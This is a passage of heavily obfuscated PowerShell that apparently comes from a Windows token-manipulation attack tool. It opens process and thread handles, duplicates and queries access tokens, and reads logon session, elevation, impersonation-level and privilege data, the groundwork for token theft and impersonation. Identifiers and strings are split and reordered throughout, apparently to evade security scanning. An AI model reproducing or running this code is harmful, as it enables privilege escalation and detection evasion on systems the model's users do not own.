            ${tO`kenpR`IVS} = ${WI`N32cOnst`A`N`TS}."T`oken_`ALl_AC`c`e`sS"
        }
        else
        {
            ${tOk`en`PrI`VS} = ${win32`CO`NsT`A`NTS}."to`K`En_`ASSIgN_`PRI`Ma`RY" -bor ${WIn`32c`ONs`Ta`NTS}."TokEn`_DU`Pl`IcaTe" -bor ${wiN32cO`NS`TA`Nts}."t`OKeN_I`Mpe`RSonA`TE" -bor ${wI`N32ConS`TA`NTS}."t`Oke`N_`Query" 
        }

        ${r`et`urnSTRu`CT} = &("{3}{2}{0}{1}" -f'bje','ct','O','New-') ("{0}{1}{2}" -f 'PS','Ob','ject')

        ${h`P`ROCESS} = ${oPEnpro`c`Ess}."I`NV`OKe"(${wIn`32cOnsT`A`NtS}."pr`OcEss`_quEry`_InFO`R`maTi`ON", ${tr`uE}, [UInt32]${pr`oCEsS`id})
        ${rE`TuRn`str`uCT} | &("{2}{1}{0}" -f'er','mb','Add-Me') -MemberType ("{2}{1}{0}{3}" -f 'rt','e','NoteProp','y') -Name ("{2}{0}{1}"-f'oces','s','hPr') -Value ${H`PR`OCE`SS}
        if (${hP`RocEsS} -eq   $0g4tVz::"ze`Ro")
        {
            
            ${E`Rr`o`RCoDE} =   (&("{2}{1}{0}" -f 'blE','ia','vAr')  ("{1}{0}" -f'0Wc','31') -VaLuEO)::("{4}{1}{2}{3}{0}" -f 'r','astWin','32Err','o','GetL').Invoke()
            &("{2}{1}{0}" -f 'ose','b','Write-Ver') "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process. "
            return ${NU`Ll}
        }
        else
        {
            [IntPtr]${h`pRoc`TOken} =  $0g4Tvz::"Z`ero"
            ${SU`cCe`SS} = ${oP`EN`pRocEsST`O`ken}."IN`VOKe"(${H`proC`eSs}, ${to`kE`NpRI`VS}, [Ref]${HPR`Oc`T`OKeN})

            
            if (-not ${cL`OSe`hANdLE}."i`NvoKE"(${hpr`Oc`Ess}))
            {
                ${erR`Orco`De} =  $310wC::("{0}{4}{1}{3}{2}" -f'GetL','in32E','or','rr','astW').Invoke()
                &("{3}{2}{0}{1}" -f'n','g','ite-Warni','Wr') ('Faile'+'d '+'to'+' '+'close'+' '+'proc'+'ess '+'han'+'dle'+', '+'t'+'his '+'i'+'s '+'unexp'+'ect'+'ed'+'. '+'Err'+'o'+'rCod'+'e: '+"$ErrorCode")
            }
            ${Hp`R`ocESs} =  (&("{1}{0}{2}"-f 'E','g','t-VARiAbLe') ("0"+"G4tv"+"Z")  ).vaLuE::"z`ERO"

            if (${SuCce`sS} -eq ${F`Al`SE} -or ${h`PrOc`To`kEn} -eq  $0G4tVz::"ze`Ro")
            {
                ${ERRO`RC`O`De} =   (  &("{2}{3}{1}{0}" -f 'e','ARiabl','gEt-','V') ('3'+'10wc')).VaLUe::("{3}{0}{2}{1}{4}" -f 'LastW','32E','in','Get','rror').Invoke()
                &("{3}{0}{2}{1}" -f'ite-','ing','Warn','Wr') "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode "
                return ${n`Ull}
            }
            else
            {
                ${rETU`RNS`TRuCT} | &("{2}{1}{0}"-f'ember','M','Add-') -MemberType ("{0}{1}{2}" -f 'NotePr','o','perty') -Name ("{2}{0}{1}" -f'rocTok','en','hP') -Value ${H`P`ROCtO`KEn}
            }
        }

        return ${re`TUR`NSTru`ct}
    }


    function g`ET-Th`R`EaDtO`kEN
    {
        Param(
            [Parameter(posITiOn=0, mandaTorY=${t`RUe})]
            [UInt32]
            ${T`hr`eadId}
        )

        ${TOke`N`p`RIVs} = ${win3`2c`ON`sTa`Nts}."tO`kEn_aLL`_`AC`CESS"

        ${R`etSTRU`CT} = &("{2}{1}{0}"-f'ject','ew-Ob','N') ("{1}{0}{2}" -f 'ec','PSObj','t')
        [IntPtr]${HTh`RE`A`dT`oken} =   (&("{1}{0}{2}"-f 'eT-vARi','G','ABle') ("{2}{1}{0}" -f 'Z','TV','0G4') -vaLuEonlY  )::"Z`ERO"

        ${h`ThReAD} = ${OPE`N`THREad}."i`NV`oKe"(${wIn32`c`on`STa`NTs}."THrEAd`_Al`L_A`c`cE`sS", ${FAl`sE}, ${tHr`eAD`ID})
        if (${ht`HR`eaD} -eq   (  &("{1}{0}" -f'le','vArIAb')  ("0g4"+"Tvz") ).vALue::"zE`RO")
        {
            ${eR`R`oRc`odE} =  $310wc::("{1}{0}{2}{3}"-f 'Win3','GetLast','2','Error').Invoke()
            if (${erROrC`o`De} -ne ${w`i`N`32Co`NsTAntS}."e`R`ROR`_INVaLiD_p`ARaMeTER") 
            {
                &("{1}{2}{3}{0}" -f 'ning','Wr','ite-Wa','r') ('F'+'aile'+'d '+'to'+' '+'open'+' '+'thr'+'ead '+'handle'+' '+'fo'+'r '+'Th'+'readI'+'d:'+' '+"$ThreadId. "+'Err'+'o'+'r '+'c'+'ode: '+"$ErrorCode")
            }
        }
        else
        {
            ${SU`cce`ss} = ${OPeNThr`EAD`TOKEn}."IN`Voke"(${hT`h`READ}, ${to`k`ENpR`ivs}, ${F`A`LSE}, [Ref]${htH`REa`D`TOKeN})
            if (-not ${s`U`CcesS})
            {
                ${eRr`oRCO`De} =  (&("{0}{1}"-f'dI','r') ("varIaB"+"Le:310W"+"C") ).vaLUE::("{2}{0}{3}{1}{4}"-f'32','ro','GetLastWin','Er','r').Invoke()
                if ((${e`Rror`cOdE} -ne ${wIn32cON`sTa`Nts}."ErROR_no_to`k`eN") -and  
                 (${eRR`ORCO`dE} -ne ${WiN`32CoNS`TAN`TS}."Err`Or_`in`Val`i`D_p`AramETER")) 
                {
                    &("{1}{3}{2}{0}" -f'ing','Wri','rn','te-Wa') ('Fai'+'led'+' '+'to'+' '+'call'+' '+'Open'+'ThreadTok'+'en'+' '+'for'+' '+'Th'+'readId:'+' '+"$ThreadId. "+'E'+'rror '+'c'+'od'+'e: '+"$ErrorCode")
                }
            }
            else
            {
                &("{2}{1}{0}"-f'ose','-Verb','Write') ("{5}{4}{7}{0}{1}{6}{10}{3}{8}{9}{2}" -f'lly ','qu','n','hre','s','Succe','e','sfu','ad t','oke','ried t')
            }

            
            if (-not ${cl`oS`EHAn`DLe}."i`Nvo`kE"(${HTh`RE`AD}))
            {
                ${ERro`R`coDe} =   (&("{1}{0}" -f'lE','vARIaB')  ("{0}{1}" -f '310w','C') ).vALUe::("{4}{2}{0}{1}{3}" -f '2','Erro','in3','r','GetLastW').Invoke()
                &("{3}{1}{0}{2}"-f'arn','W','ing','Write-') ('Fai'+'led '+'t'+'o '+'c'+'lose '+'thr'+'ead '+'handl'+'e, '+'t'+'his '+'is'+' '+'u'+'ne'+'xpec'+'ted. '+'Er'+'rorCo'+'de:'+' '+"$ErrorCode")
            }
            ${hTH`R`eAd} =   $0g4tVZ::"Z`ero"
        }

        ${rEtstr`u`Ct} | &("{1}{0}{2}" -f 'Me','Add-','mber') -MemberType ("{3}{2}{0}{1}" -f 'eProp','erty','t','No') -Name ("{2}{0}{1}" -f 'adT','oken','hThre') -Value ${HThr`EAdt`oken}
        return ${rET`sT`Ru`ct}
    }


    
    function get-`TO`kEnIn`Fo`RmAtION
    {
        Param(
            [Parameter(PoSITIoN=0, MandATorY=${T`RuE})]
            [IntPtr]
            ${Ht`oK`EN}
        )

        ${Re`TUR`NOBj} = ${n`ULl}

        ${T`oKEns`Tats`sI`Ze} =  $310wC::"SIZ`eof"([Type]${t`OkeN_`StAT`I`STicS})
        [IntPtr]${t`oKEnsT`A`TsPTr} =  $310wC::("{0}{1}{2}" -f 'All','o','cHGlobal').Invoke(${tok`ENS`T`AtSS`IzE})
        [UInt32]${r`eaL`SizE} = 0
        ${su`C`cesS} = ${Get`T`OKe`N`iNf`ORmAtIoN}."Inv`OkE"(${Ht`OkEN}, ${tOK`en`_in`FoRM`Ati`oN_`cLaSs}::"To`K`ENsT`At`isTics", ${TOKENS`T`ATSP`Tr}, ${tokEnS`T`A`Tss`izE}, [Ref]${reAL`SI`Ze})
        if (-not ${sUCC`E`SS})
        {
            ${ERr`O`R`CodE} =   (&("{0}{1}"-f'dI','r') ("{0}{2}{3}{1}{4}" -f 'vA','0w','Ri','ABLe:31','c')  ).VAlUe::("{1}{3}{2}{4}{0}"-f '32Error','Get','astW','L','in').Invoke()
            &("{1}{2}{0}{3}"-f 'te-Warni','Wr','i','ng') ('G'+'etTo'+'ke'+'nIn'+'f'+'ormation '+'fail'+'ed'+'. '+'Err'+'or '+'code:'+' '+"$ErrorCode")
        }
        else
        {
            ${tOKEns`T`AtS} =  $310WC::"P`Tr`TOS`TRuCTurE"(${ToKENs`TA`TspTR}, [Type]${tokEn`_St`AtiSt`icS})

            
            ${luiD`P`Tr} =  $310Wc::"Al`LocHgLO`BAL"(  $310Wc::"si`Z`eOf"([Type]${LU`Id}))
             ( &("{0}{1}{2}"-f 'g','Et','-vARiAblE')  ('3'+'10wC')  -ValuE )::("{0}{1}{2}" -f'S','truc','tureToPtr').Invoke(${To`kENST`AtS}."A`Ut`hEnTIC`A`TIonID", ${L`Uid`pTR}, ${FA`lsE})

            [IntPtr]${LogONSes`S`Io`N`dATAptr} =   (&("{2}{1}{0}" -f 'ble','A','VArI') ("{1}{0}"-f'4TVz','0g') ).VAlue::"Z`eRO"
            ${ReT`u`RnvaL} = ${lsA`geT`lOg`OnseS`siO`NdAtA}."iNVo`kE"(${Luid`P`TR}, [Ref]${loGonS`E`sS`io`NdATaptr})
            if (${RETUR`N`Val} -ne 0 -and ${L`O`gonsESSI`O`ND`ATAptR} -eq   (&("{0}{1}{2}" -f 'cH','iL','dItem')  ("{2}{3}{4}{1}{0}" -f 'g4tVz',':0','V','Ar','IAble')  ).VALUE::"Ze`RO")
            {
                &("{1}{4}{3}{0}{2}"-f 'i','Wri','ng','rn','te-Wa') ('Cal'+'l '+'t'+'o '+'Lsa'+'GetLogo'+'nSes'+'sionDat'+'a '+'fail'+'e'+'d. '+'E'+'rro'+'r '+'co'+'de: '+"$ReturnVal. "+'Log'+'onS'+'essionD'+'ataPtr'+' '+'= '+"$LogonSessionDataPtr")
            }
            else
            {
                ${LoGoNsE`Ss`ionD`A`TA} =   (  &("{2}{0}{1}"-f'aria','BlE','V') ("{1}{0}" -f '10wc','3') -valUEo )::"ptRtost`RU`cTUrE"(${LO`G`oNSe`s`si`oNDatAPTr}, [Type]${S`ecUR`itY_LoG`on_se`Ss`ion`_daTA})
                if (${lOGo`N`sEssioNd`ATA}."U`SERNAmE"."buF`FEr" -ne   (&("{1}{0}" -f 'IR','D')  ("va"+"RIa"+"bl"+"E:0G4tV"+"Z")  ).ValUe::"ze`Ro" -and 
                    ${LOG`OnsEs`sioNdA`Ta}."L`OgI`NDOmAIN"."Buf`FER" -ne  ( &("{0}{3}{2}{1}"-f'geT-','Le','ariAB','V') ("{0}{2}{1}" -f '0G4','vz','T')).vaLUe::"ZE`RO")
                {
                    
                    ${u`SER`NAMe} =   $310wC::("{2}{4}{1}{3}{0}" -f 'i','ringU','Pt','n','rToSt').Invoke(${lo`gons`E`SS`iONdaTa}."U`SErnA`mE"."BU`FFer", ${l`OGOnSEs`SiO`NData}."Us`ER`NAMe"."Le`NG`Th"/2)
                    ${D`O`mAiN} =  $310wc::("{0}{2}{1}" -f 'P','ingUni','trToStr').Invoke(${lOg`oNsE`SS`i`o`NDAta}."Log`in`DomaIn"."BUFf`Er", ${LogoNS`Ess`ION`D`AtA}."L`oGiNdom`AIN"."l`E`NgtH"/2)

                    
                    
                    
                    if (${User`N`AmE} -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]${sI`ze} = 100
                        [UInt32]${n`UmUS`ernAMECH`Ar} = ${si`ze} / 2
                        [UInt32]${n`uMdom`AI`NcHaR} = ${s`IZe} / 2
                        [UInt32]${SiDna`Meu`sE} = 0
                        ${USeRNA`me`Buf`Fer} =   (&("{3}{0}{2}{1}"-f 'Dit','m','E','gEt-CHiL')  ('varIabLe'+':'+'310'+'W'+'c')).VaLuE::("{0}{3}{1}{2}" -f'A','ba','l','llocHGlo').Invoke(${si`ZE})
                        ${dOMai`NB`uffER} =  (  &("{2}{0}{3}{1}" -f 'Ld','Tem','CHI','I')  ("{1}{2}{0}"-f'iAbLe:310Wc','V','aR')).vAluE::("{3}{0}{2}{1}" -f 'HG','al','lob','Alloc').Invoke(${SI`ze})
                        ${sU`C`CeSs} = ${Loo`k`u`PaCCOun`TSidW}."inv`Oke"(  $0G4tvZ::"z`eRO", ${lo`gOn`sE`S`siONDaTa}."S`ID", ${uSer`N`AmebUf`F`ER}, [Ref]${nu`mus`er`NameCh`Ar}, ${do`MAInBUF`FER}, [Ref]${N`UMd`o`mAInchAr}, [Ref]${S`iD`NAmE`use})

                        if (${SUc`c`eSs})
                        {
                            ${User`N`Ame} =   (  &("{3}{1}{4}{2}{0}" -f 'M','hIL','ITe','gET-c','D')  ("V"+"A"+"rIAble:31"+"0Wc")  ).VALuE::("{0}{2}{1}"-f 'Ptr','ringUni','ToSt').Invoke(${u`sEr`NAMEB`UFfeR})
                            ${DomA`In} =   ( &("{2}{1}{0}{3}"-f 'a','Et-vARi','g','blE') ("{1}{0}" -f 'wC','310')  ).vAlue::("{4}{3}{2}{0}{1}"-f 'ingUn','i','tr','rToS','Pt').Invoke(${dOM`A`InBUffER})
                        }
                        else
                        {
                            ${error`co`DE} =   $310wc::("{4}{1}{3}{0}{2}" -f 'Win32','a','Error','st','GetL').Invoke()
                            &("{3}{2}{0}{1}"-f'-Warnin','g','ite','Wr') ('Err'+'or '+'cal'+'l'+'ing '+'Lo'+'okupA'+'ccount'+'SidW. '+'Err'+'or '+'code'+': '+"$ErrorCode")
                        }

                          $310WC::("{0}{2}{1}"-f'F','HGlobal','ree').Invoke(${UsER`NAMEb`U`FFeR})
                        ${usErname`B`U`Ffer} =  $0g4TvZ::"z`eRO"
                          $310Wc::("{0}{1}{3}{2}"-f'F','r','Global','eeH').Invoke(${DomAI`NB`uF`FEr})
                        ${D`OmaiNB`u`F`FER} =   $0G4tVZ::"Ze`RO"
                    }

                    ${RET`UR`N`oBJ} = &("{0}{2}{1}"-f'New-O','ect','bj') ("{1}{0}" -f 'ct','PSObje')
                    ${r`EtUr`NoBJ} | &("{2}{1}{0}{3}"-f'b','Mem','Add-','er') -Type ("{0}{1}{2}"-f'Note','Pr','operty') -Name ("{1}{0}" -f'n','Domai') -Value ${D`oM`AiN}
                    ${REtU`R`NObj} | &("{1}{0}{2}" -f 'dd-Membe','A','r') -Type ("{1}{2}{0}{3}"-f 'teP','N','o','roperty') -Name ("{1}{0}{2}" -f 'ser','U','name') -Value ${use`RN`Ame}    
                    ${re`TUr`NoBJ} | &("{1}{2}{0}" -f'r','Add-','Membe') -Type ("{2}{1}{0}{3}"-f'pert','tePro','No','y') -Name ("{0}{1}"-f 'hT','oken') -Value ${hTO`ken}
                    ${reT`uRn`oBJ} | &("{0}{2}{3}{1}"-f 'Ad','r','d-','Membe') -Type ("{3}{2}{0}{1}"-f 'p','erty','ro','NoteP') -Name ("{1}{0}{2}" -f 'onTyp','Log','e') -Value ${LO`GoNsEs`sI`On`DaTa}."lOG`on`Ty`pe"


                    
                    ${REtU`RNo`BJ} | &("{0}{2}{1}" -f 'A','-Member','dd') -Type ("{2}{0}{1}" -f 'er','ty','NoteProp') -Name ("{0}{2}{1}" -f'Is','d','Elevate') -Value ${F`AlsE}

                    ${to`KEnELEV`ATi`o`NSIze} =   ( &("{3}{1}{2}{0}"-f 'le','I','AB','GeT-VaR') ("{1}{0}"-f '0wc','31') -ValUE )::"sIze`Of"([Type]${Token`_El`e`VatIon})
                    ${tOkE`Ne`leV`AtiOnPtr} =   (  &("{0}{1}" -f 'VaR','IabLe')  ('3'+'10wC')  ).VaLuE::("{3}{2}{1}{0}"-f'obal','cHGl','lo','Al').Invoke(${TO`k`e`NeLE`VaTioN`sIZE})
                    [UInt32]${R`EAls`IZe} = 0
                    ${sUC`ce`SS} = ${geTtO`k`eN`inFORmA`Ti`On}."InVo`KE"(${ht`oken}, ${t`oKen_I`NFo`Rm`ATIon_c`LAsS}::"tOKe`Ne`levatIoN", ${ToK`E`Ne`LEVAti`OnP`TR}, ${T`Ok`ENE`L`evAtIoNSize}, [Ref]${r`eAlSi`ze})
                    if (-not ${S`uCCeSs})
                    {
                        ${Err`oRC`OdE} =   ( &("{1}{0}{2}"-f'bl','get-VarIa','e')  ("{1}{0}"-f 'C','310W')  -VALuEONL )::("{0}{2}{3}{4}{1}"-f'G','tWin32Error','et','L','as').Invoke()
                        &("{0}{1}{2}"-f 'Write-Wa','rn','ing') ('GetTo'+'kenIn'+'for'+'ma'+'tion '+'f'+'ailed '+'to'+' '+'retriev'+'e'+' '+'Tok'+'e'+'nE'+'levatio'+'n '+'stat'+'u'+'s. '+'Erro'+'rCo'+'de: '+"$ErrorCode") 
                    }
                    else
                    {
                        ${tO`ke`NELEVa`TIoN} =   $310WC::"pT`RtoStr`uctUrE"(${tOKENE`L`eVa`Tionp`Tr}, [Type]${ToKEn_`eLev`A`T`ioN})
                        if (${T`OkeNELevA`TI`On}."tOkENi`se`leVa`TED" -ne 0)
                        {
                            ${ReTU`R`NoBJ}."iseL`Ev`ATed" = ${tR`uE}
                        }
                    }
                     (&("{0}{3}{2}{1}"-f'ge','abLe','vAri','t-') ('3'+'10WC')).VaLuE::("{0}{1}{2}"-f 'F','re','eHGlobal').Invoke(${Toke`NE`leVAT`io`NpTR})


                    
                    ${ret`U`RnobJ} | &("{1}{2}{0}" -f 'r','Ad','d-Membe') -Type ("{2}{1}{3}{0}" -f'y','Pro','Note','pert') -Name ("{2}{0}{1}"-f'kenTy','pe','To') -Value ("{1}{4}{2}{0}{3}" -f'ToRet','Un','e','rieve','abl')

                    [UInt32]${T`o`KenTYpEs`IZE} = 4
                    [IntPtr]${TO`ke`NTYPePtR} =  $310wc::("{1}{0}{2}" -f 'ocHGlo','All','bal').Invoke(${toKenTYpe`s`I`zE})
                    [UInt32]${RE`A`LSIze} = 0
                    ${sUcC`e`SS} = ${GeTTOkeN`I`N`F`OrmaTIoN}."InV`O`KE"(${Ht`okEN}, ${T`OkeN_I`NFORMA`Ti`oN_`C`lAss}::"t`OK`entyPE", ${T`oKe`NTyP`Ep`Tr}, ${T`Ok`ENT`yPESIzE}, [Ref]${Re`Al`sIZe})
                    if (-not ${Su`C`CESS})
                    {
                        ${e`RROr`cODE} =   $310wc::("{2}{4}{0}{1}{3}"-f'astWi','n','G','32Error','etL').Invoke()
                        &("{0}{1}{2}{3}"-f'Wr','ite','-Wa','rning') ('Get'+'TokenInfo'+'r'+'mat'+'i'+'on '+'fa'+'il'+'ed '+'to'+' '+'re'+'trieve '+'Tok'+'enImper'+'sona'+'tion'+'L'+'eve'+'l '+'sta'+'t'+'us. '+'Er'+'rorCode'+': '+"$ErrorCode")
                    }
                    else
                    {
                        [UInt32]${Token`T`ype} =   ( &("{0}{1}{2}{3}"-f 'g','ET-CHil','dITe','M')  ("{1}{2}{0}"-f'C','VArIABlE:31','0W')).vAlue::"PtRtost`R`u`cTUrE"(${t`OkentYpe`P`Tr}, [Type][UInt32])
                        switch(${tO`kE`NTYpe})
                        {
                            1 {${Re`TUR`NObj}."t`oKEn`TypE" = ("{0}{1}{2}"-f'Pr','im','ary')}
                            2 {${REt`UR`NOBj}."t`Oke`NType" = ("{0}{2}{1}{4}{3}" -f'Impe','t','rsona','n','io')}
                        }
                    }
                     (&("{0}{2}{1}"-f'Va','E','RIabL') ("{0}{1}" -f'31','0Wc')  -ValUEOn)::("{1}{2}{3}{0}" -f 'lobal','Fre','eH','G').Invoke(${t`o`keNTyp`ePTr})


                    
                    if (${R`eTU`RnOBj}."t`ok`EnTypE" -ieq ("{0}{2}{1}" -f 'Impers','nation','o'))
                    {
                        ${RE`TURN`obj} | &("{0}{1}{2}" -f'Ad','d-Mem','ber') -Type ("{2}{1}{0}"-f 'Property','te','No') -Name ("{0}{5}{4}{2}{3}{1}"-f'Imperson','l','ev','e','tionL','a') -Value ("{3}{0}{2}{1}" -f 'leT','etrieve','oR','Unab')

                        [UInt32]${imP`e`Rs`oN`A`TIOnl`EvElsIzE} = 4
                        [IntPtr]${i`MPeRSo`N`A`TiOn`lEv`eLPtR} =   (  &("{0}{1}" -f 'VaRIabL','E') ("{0}{1}"-f'310','WC') ).vALue::("{0}{1}{2}"-f 'AllocH','Glob','al').Invoke(${iM`pe`RS`OnAtiOnLEVe`LSIzE}) 
                        [UInt32]${rE`AL`Si`ZE} = 0
                        ${su`c`cESs} = ${gE`TtO`k`EninFORM`ATIon}."IN`V`okE"(${hTO`KEn}, ${To`KEN_inFO`R`maTioN_`CL`A`sS}::"To`kENI`mPeRs`O`NAtionLe`Vel", ${i`Mpe`RS`ONAt`IonLEVELPtr}, ${I`mp`ers`OnA`TI`Onle`VeLsIze}, [Ref]${REa`l`s`iZe})
                        if (-not ${Succ`eSS})
                        {
                            ${ERR`oR`CODE} =   ( &("{0}{1}"-f 'G','cI')  ("{3}{1}{0}{2}"-f'310W','riAbLE:','c','VA')).vaLUE::("{3}{1}{2}{0}"-f 'or','stWin','32Err','GetLa').Invoke()
                            &("{0}{2}{1}{3}" -f 'Wri','-Warni','te','ng') ('G'+'etToke'+'nIn'+'fo'+'rmation'+' '+'faile'+'d '+'t'+'o '+'retri'+'e'+'ve '+'Toke'+'nImpe'+'rsonati'+'onLev'+'el '+'sta'+'tus.'+' '+'Err'+'or'+'Code: '+"$ErrorCode")
                        }
                        else
                        {
                            [UInt32]${imP`ERSO`N`AtIOnlE`V`el} =  ( &("{1}{2}{0}"-f'm','chILdI','Te')  ("v"+"a"+"RIaBLE:310W"+"C") ).vAlue::"p`T`RTosTruCtu`RE"(${iM`Pers`oNatIOnl`eVE`Lptr}, [Type][UInt32])
                            switch (${Imp`eR`SONAT`ioNLEvEL})
                            {
                                0 { ${re`TUrNO`BJ}."i`MpE`RsonAt`iOnLeVeL" = ("{1}{3}{4}{0}{2}" -f'ony','Se','mous','cu','rityAn') }
                                1 { ${r`etur`NOBJ}."IMPER`S`oN`AtiO`NLEvel" = ("{2}{1}{3}{4}{0}" -f 'entification','curit','Se','yI','d') }
                                2 { ${r`eTU`RNO`Bj}."im`PeRS`onAtIon`leVEl" = ("{2}{3}{1}{0}{4}{5}" -f'mpers','ityI','Sec','ur','ona','tion') }
                                3 { ${re`TUr`NObj}."iM`pERSon`AtIonle`VeL" = ("{3}{1}{0}{2}" -f'yDelegatio','ecurit','n','S') }
                            }
                        }
                          ( &("{1}{0}{2}"-f 'vaRi','gEt-','AblE') ("{0}{1}"-f '3','10Wc')  -valuEo )::("{1}{0}{2}"-f 'eH','Fre','Global').Invoke(${im`PErSoNATiO`N`L`EVELPtr})
                    }


                    
                    ${rEt`urno`BJ} | &("{0}{1}{2}"-f'Add-','Memb','er') -Type ("{0}{2}{1}{3}" -f'N','per','otePro','ty') -Name ("{1}{0}{3}{2}" -f'si','Ses','D','onI') -Value ("{0}{1}" -f 'Unkno','wn')

                    [UInt32]${to`keNS`Essi`OnIDS`Ize} = 4
                    [IntPtr]${ToK`E`NsESS`iOniDp`TR} =  ( &("{0}{1}" -f 'g','cI') ("{0}{1}{2}{3}{4}"-f'VaRI','ABlE',':3','10w','c') ).valuE::("{1}{2}{0}"-f 'al','Al','locHGlob').Invoke(${tOKenSESs`ioN`iDsI`ZE})
                    [UInt32]${r`EALs`Ize} = 0
                    ${succ`e`ss} = ${G`etTOKEn`In`ForMa`T`ioN}."i`NVOKE"(${ht`o`ken}, ${t`OK`eN`_in`FORmatio`N_Cl`ASS}::"T`okEnses`SIoNid", ${TO`kENSESSiO`N`Id`PtR}, ${to`kENseSs`iONiDSi`zE}, [Ref]${Realsi`Ze})
                    if (-not ${su`ccE`Ss})
                    {
                        ${e`R`ROrCODE} =  (&("{2}{0}{1}{3}"-f'-','Va','GET','Riable') ("31"+"0wc")  -vALUeoNl )::("{1}{3}{2}{0}"-f 'n32Error','GetL','stWi','a').Invoke()
                        &("{2}{1}{3}{0}" -f 'ng','-','Write','Warni') ('Ge'+'tTokenIn'+'f'+'orm'+'atio'+'n '+'fa'+'ile'+'d '+'to'+' '+'retriev'+'e '+'Token'+' '+'Sessio'+'n'+'Id.'+' '+'Erro'+'rC'+'ode: '+"$ErrorCode")
                    }
                    else
                    {
                        [UInt32]${t`oKEnS`eSSIoniD} =  ( &('ls')  ('vARi'+'ABLe:'+'310wC')  ).vaLUE::"p`TRtO`sTRuct`U`Re"(${T`OkENS`Es`si`oN`IdPtr}, [Type][UInt32])
                        ${RE`TuRn`obj}."sEss`Io`N`Id" = ${TOK`E`NSeSs`IOn`ID}
                    }
                     $310wC::("{3}{1}{2}{0}" -f'bal','eH','Glo','Fre').Invoke(${To`K`eNsE`sSIONIdPTR})


                    
                    ${r`E`TuRn`OBJ} | &("{2}{1}{0}" -f'mber','e','Add-M') -Type ("{1}{0}{2}"-f'Prop','Note','erty') -Name ("{0}{4}{3}{2}{1}" -f'Priv','ed','l','ab','ilegesEn') -Value @()
                    ${rETU`RNo`BJ} | &("{2}{0}{1}"-f'm','ber','Add-Me') -Type ("{0}{1}{3}{2}" -f 'N','ot','rty','ePrope') -Name ("{0}{5}{4}{3}{1}{2}" -f'Privileges','b','le','a','vail','A') -Value @()

                    [UInt32]${TOKenpRiV`ilEgeS`s`ize} = 1000
                    [IntPtr]${ToK`EnpR`iV`i`LEge`S`pTR} =  (  &("{2}{1}{0}" -f 'e','L','GEt-VaRIAb') ("{0}{1}" -f '31','0wC')  -vaLu)::("{3}{2}{0}{1}" -f 'ocHGl','obal','ll','A').Invoke(${TokeN`pri`V`ILEgES`SIZe})
                    [UInt32]${rea`L`sizE} = 0
                    ${suC`CESs} = ${g`ET`TOKE`NInFO`RMATiOn}."I`NVOKE"(${HT`oKen}, ${TOKEN_`Info`R`matI`oN_clAsS}::"T`OKe`NP`RIv`IleGeS", ${ToKe`Np`Ri`VIl`EGESPTR}, ${tO`kEnp`RI`V`ileGESSiZe}, [Ref]${R`eAl`size})
                    if (-not ${SU`Cce`ss})
                    {
                        ${err`oRC`oDE} =   (&("{2}{1}{4}{0}{3}"-f'hILdiT','ET','g','EM','-c')  ("V"+"a"+"RiAble:3"+"10"+"wC")).VaLUe::("{5}{4}{1}{0}{2}{3}" -f 'in3','tW','2Er','ror','Las','Get').Invoke()
                        &("{1}{2}{0}" -f'g','Writ','e-Warnin') ('G'+'etToken'+'Inf'+'ormation'+' '+'fai'+'led '+'t'+'o '+'re'+'trieve '+'Token'+' '+'Session'+'I'+'d. '+'ErrorC'+'od'+'e: '+"$ErrorCode")
                    }
                    else
                    {
                        ${t`okEn`P`RiV`ILEgES} =  ( &("{2}{0}{1}{3}"-f'et-va','r','G','IaBLe')  ("{0}{1}"-f '31','0wc')).ValUE::"PTRtos`TrUct`u`RE"(${tO`Ke`NPriV`ILeg`eS`pTR}, [Type]${T`O`kEn_pR`ivIle`G`eS})
                        
                        
                        [IntPtr]${pRI`V`ILeg`e`sBASEPTR} = [IntPtr](&("{0}{5}{1}{3}{4}{2}" -f'Add-S','g','AsUnsigned','ne','dInt','i') ${T`oKeNP`R`IVilE`G`E`SpTR} ( ( &("{0}{1}"-f'g','cI') ("V"+"A"+"Ri"+"AblE:310Wc")).ValUe::"OFF`Se`ToF"([Type]${To`ken`_`P`RI`VILEGEs}, ("{0}{1}{2}" -f'Privil','eg','es'))))
                        ${LUIDA`Ndat`TrIB`U`TE`s`ize} =  (  &("{0}{1}{2}" -f 'Ge','t-v','ArIablE')  ("310"+"wC") ).ValUe::"S`iZEOF"([Type]${lU`Id_an`d_a`TTRIBUtes})
                        for (${I} = 0; ${I} -lt ${T`oK`eNP`RiViLEg`ES}."prI`Vil`e`gecOUnT"; ${i}++)
                        {
                            ${l`uI`D`A`NDAtt`RibUTEpTr} = [IntPtr](&("{1}{4}{3}{2}{0}" -f 'ed','Add-Si','n','nsig','gnedIntAsU') ${pri`V`il`egesb`AS`ePtR} (${L`UIDan`da`TtRibUTeSi`ZE} * ${I}))

                            ${LUi`dANDa`T`T`Rib`uTe} =  $310Wc::"pt`R`To`StrUcTURE"(${l`uiDa`NdAttrIBUt`eP`TR}, [Type]${L`UID_a`Nd_aTT`RIBUTes})

                            
                            [UInt32]${Pr`IvILeg`enaMES`i`zE} = 60
                            ${pR`I`VIL`E`genaMePtr} =   (&("{2}{0}{1}"-f'HilD','ITEm','C') ("{1}{4}{0}{2}{3}" -f 'L','VaRia','e:31','0wc','B')  ).Value::("{1}{0}{3}{2}"-f'cHG','Allo','al','lob').Invoke(${pR`iVI`LEGEN`AMesi`ZE})
                            ${P`L`UID} = ${LuIdAN`da`Tt`R`ibUTEP`TR} 

                            ${s`Uc`CesS} = ${LOOk`upp`RiVilEgEN`A`M`eW}."IN`Voke"( (&("{0}{1}" -f 'I','tEM')  ("{2}{3}{1}{0}{4}" -f'Ble:0G4','A','v','aRI','tVz') ).ValUE::"z`eRO", ${PlU`id}, ${p`R`Iv`IL`eG`enAmEPtr}, [Ref]${p`Ri`V`ILeg`enAMeSIZE})
                            if (-not ${sucC`E`Ss})
                            {
                                ${e`R`Ro`RCoDe} =  (  &("{1}{2}{0}" -f 'BLE','vA','ria') ('310w'+'c') -VAlueonLy)::("{5}{1}{0}{2}{4}{3}"-f 'i','etLastW','n32E','or','rr','G').Invoke()
